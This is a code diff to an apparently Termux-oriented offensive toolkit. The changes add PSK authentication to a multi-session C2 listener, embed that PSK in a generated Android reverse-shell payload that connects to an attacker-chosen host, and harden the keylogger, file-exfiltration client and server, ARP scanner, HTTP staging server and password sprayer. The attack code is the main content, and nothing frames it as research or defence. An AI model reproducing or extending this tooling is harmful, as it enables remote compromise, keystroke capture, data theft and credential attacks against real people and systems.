@@ -18,10 +18,13 @@ DEFAULTS = {"port": "4444", "ports": "1-1000", "cidr": "192.168.1.0/24", "c2port
 def load_cfg():
     d = dict(DEFAULTS)
     try:
-        d.update(json.load(open(CFG)))
-    except Exception:
+        with open(CFG) as f: d.update(json.load(f))
+    except FileNotFoundError:
         pass
+    except Exception as e:
+        print(f"warning: config.json korup/rusak ({e}) — pakai default", file=sys.stderr)
     return d
+
 D = load_cfg()
 def save_cfg():
     try:
@@ -129,6 +132,8 @@ def _run(key):
 def parse_ranges(s):
     out = []
     for part in s.split(","):
+        part = part.strip()
+        if not part: continue  # trailing/double comma
         a, b = part.split("-") if "-" in part else (part, part)
         out.extend(range(int(a), int(b) + 1))
     return out
@@ -242,16 +247,51 @@ def mod_shell():
 # ---------------- c2 (multi-session) ----------------
 SESSIONS = {}
 _session_counter = [0]
+PSK_FILE = os.path.join(DATA, "c2.psk")
 
 def xor_stream(data, key_rot):
     return bytes((b ^ (i + key_rot) & 0xFF) for i, b in enumerate(data))
 
-def c2_accept(srv):
+def c2_psk():
+    """Shared secret untuk auth handshake c2. Buat sekali, pakai terus (K7)."""
+    try:
+        with open(PSK_FILE) as f:
+            psk = f.read().strip()
+            if psk: return psk
+    except OSError:
+        pass
+    import secrets
+    psk = secrets.token_hex(16)
+    with open(PSK_FILE, "w") as f: f.write(psk)
+    try: os.chmod(PSK_FILE, 0o600)
+    except OSError: pass
+    return psk
+
+def c2_accept(srv, psk):
     while True:
         try:
             c, a = srv.accept()
         except OSError:
             break
+        try:
+            c.settimeout(10)
+            hello = b""
+            while b"\n" not in hello:
+                d = c.recv(64)
+                if not d: raise OSError("no auth")
+                hello += d
+                if len(hello) > 256: raise OSError("auth too long")
+        except Exception:
+            try: c.close()
+            except Exception: pass
+            print(f"[-] {a} auth gagal (tanpa PSK/timeout)")
+            continue
+        if hello.strip().decode(errors="replace") != psk:
+            try: c.close()
+            except Exception: pass
+            print(f"[-] {a} PSK salah")
+            continue
+        c.settimeout(None)
         _session_counter[0] += 1
         sid = "S%d" % _session_counter[0]
         SESSIONS[sid] = (c, a)
@@ -262,11 +302,18 @@ def mod_c2():
     if not sys.stdin.isatty():
         print("c2 is interactive; run from a tty (ctrl-c to stop). exiting.")
         return
-    port = int(get_port("c2port"))
+    port_s = get_port("c2port")
+    try: port = int(port_s)
+    except ValueError: print(f"bad port '{port_s}'"); return
     srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind(("", port)); srv.listen(5)
-    threading.Thread(target=c2_accept, args=(srv,), daemon=True).start()
-    print(f"listening 0.0.0.0:{port} — commands: sessions | use N | kill N | exit")
+    try:
+        srv.bind(("", port))
+    except OSError as e:
+        print(f"bind :{port} gagal ({e}) — port dipakai proses lain?"); return
+    srv.listen(5)
+    psk = c2_psk()
+    threading.Thread(target=c2_accept, args=(srv, psk), daemon=True).start()
+    print(f"listening 0.0.0.0:{port} (PSK: {PSK_FILE}) — commands: sessions | use N | kill N | exit")
     current = None
     try:
         while True:
@@ -363,7 +410,12 @@ def mod_keylog():
         print(f"bad duration '{dur}' — treated as forever"); tk = None
     if not _TERMIOS:
         print("keylogger needs a tty; use a real termux shell"); return
-    fd = sys.stdin.fileno(); old = termios.tcgetattr(fd); tty.setraw(fd)
+    fd = sys.stdin.fileno()
+    try:
+        old = termios.tcgetattr(fd)
+    except (termios.error, OSError, ValueError):
+        print("keylogger needs a tty; stdin bukan terminal"); return
+    tty.setraw(fd)
     start = time.time()
     fn = os.path.join(DATA, "keys.log")
     buf = open(fn, "a")
@@ -383,7 +435,9 @@ def mod_keylog():
 def mod_exfil():
     section("EXFIL CLIENT (send file)")
     server = ask("listener ip: ").strip()
-    port = int(get_port("exfil"))
+    port_s = get_port("exfil")
+    try: port = int(port_s)
+    except ValueError: print(f"bad port '{port_s}'"); return
     fpath = ask("file to send: ").strip()
     if not os.path.isfile(fpath): print("file not found"); return
     name, size = os.path.basename(fpath), os.path.getsize(fpath)
@@ -400,9 +454,15 @@ def mod_exfil():
 
 def mod_recv():
     section("EXFIL SERVER")
-    port = int(ask("listen port [%s]: " % D.get("exfil", "12345")) or D.get("exfil", "12345"))
+    port_s = ask("listen port [%s]: " % D.get("exfil", "12345")) or D.get("exfil", "12345")
+    try: port = int(port_s)
+    except ValueError: print(f"bad port '{port_s}'"); return
     srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind(("", port)); srv.listen(1)
+    try:
+        srv.bind(("", port))
+    except OSError as e:
+        print(f"bind :{port} gagal ({e}) — port dipakai proses lain?"); return
+    srv.listen(1)
     print(f"listening 0.0.0.0:{port}...")
     c, _ = srv.accept()
     c.settimeout(15)
@@ -445,16 +505,21 @@ def mod_payload():
     section("ANDROID PAYLOAD BUILDER")
     host = ask("c2 host: ").strip()
     port = get_port("port")
+    try: int(port)
+    except (ValueError, TypeError): print(f"bad port '{port}'"); return
     xm = ask("obfuscate stream? [y/N] ").strip().lower() == "y"
     out = os.path.join(DATA, "payload.py")
+    psk = c2_psk()
     if xm:
         p = f'''#!/usr/bin/env python3
 import socket,subprocess,os,time
 HOST,PORT="{host}",{port}
+PSK="{psk}"
 def x(b,k): return bytes((x^(i+k)&0xFF for i,x in enumerate(b)))
 while True:
     try:
         s=socket.socket();s.connect((HOST,int(PORT)))
+        s.sendall(PSK.encode()+b"\\n")
         while 1:
             cmd=s.recv(4096)
             if not cmd: break
@@ -467,10 +532,12 @@ while True:
         p = f'''#!/usr/bin/env python3
 import socket,subprocess,os,time
 HOST,PORT="{host}",{int(port)}
+PSK = {psk!r}
 SH = "/system/bin/sh" if os.path.exists("/system/bin/sh") else ("/bin/sh" if os.path.exists("/bin/sh") else "sh")
 while True:
     try:
         s=socket.socket();s.connect((HOST,int(PORT)))
+        s.sendall(PSK.encode()+b"\\n")
         os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
         subprocess.call([SH,"-i"])
         s.close()
@@ -563,14 +630,15 @@ def mod_arp():
         except OSError: pass
     for ip in ips: arp_req(ip)
     time.sleep(0.8)
-    s.settimeout(0.15)
+    seen_ips = set()
     try:
         while True:
             data, _ = s.recvfrom(2048)
             if len(data) >= 42 and data[14:16] == b"\x00\x01" and data[20:22] == b"\x00\x02":
                 m = ":".join(f"{b:02x}" for b in data[6:12])
                 ip = socket.inet_ntoa(data[28:32])
-                if ip not in {x for _, x in found}: found.append((m, ip))
+                if ip not in seen_ips:
+                    seen_ips.add(ip); found.append((m, ip))
     except (socket.timeout, OSError):
         pass
     s.close()
@@ -672,13 +740,18 @@ def mod_persist():
 # ---------------- serve + spray ----------------
 def mod_serve():
     section("HTTP STAGING SERVER")
-    port = int(get_port("serve") or "8080")
+    port_s = get_port("serve") or "8080"
+    try: port = int(port_s)
+    except ValueError: print(f"bad port '{port_s}'"); return
     root = ask(f"dir to serve [%s]: " % os.path.join(DATA, "serve")).strip() or os.path.join(DATA, "serve")
     os.makedirs(root, exist_ok=True)
     from http.server import HTTPServer, SimpleHTTPRequestHandler
     import functools, http.server
     h = functools.partial(SimpleHTTPRequestHandler, directory=root)
-    srv = HTTPServer(("0.0.0.0", port), h)
+    try:
+        srv = HTTPServer(("0.0.0.0", port), h)
+    except OSError as e:
+        print(f"bind :{port} gagal ({e}) — port dipakai proses lain?"); return
     print(f"serving {root} on 0.0.0.0:{port} (ctrl-c stop) — drop files here for target")
     try: srv.serve_forever()
     except KeyboardInterrupt: pass
@@ -714,7 +787,9 @@ def mod_spray():
         except Exception:
             pass
     for u in userlist:
-        for pw in passes: try_one(u, pw, None, user_field, pass_field)
+        for pw in passes:
+            try_one(u, pw, None, user_field, pass_field)
+            time.sleep(0.05)  # rate-limit ringan (K3) — jangan hammer target
     save("spray", url, "hits=" + str(hit or []))
     print(f"done. hits: {hit or 'none'}")
 
@@ -924,6 +999,12 @@ def cli_one(key, a, extra=None):
         l = getattr(extra, "limit", None) if extra else None
         vals = [k or "", l or "30"]
     if key == "cfg" and not vals: vals = ["", ""]
+    # spray prompt order: url, user_field, pass_field, users, wordlist.
+    # CLI slots user_field/pass_field kosong -> module default (username/password).
+    if key == "spray":
+        users_v = getattr(extra, "users", None) if extra else None
+        wl = getattr(extra, "wordlist", None) if extra else None
+        vals = (vals[:1] if vals else []) + ["", "", str(users_v or "")] + ([str(wl)] if wl else [])
     GINJ = vals
     try: MODULES[key][1]()
     except Exception as e: print(f"error: {e}")
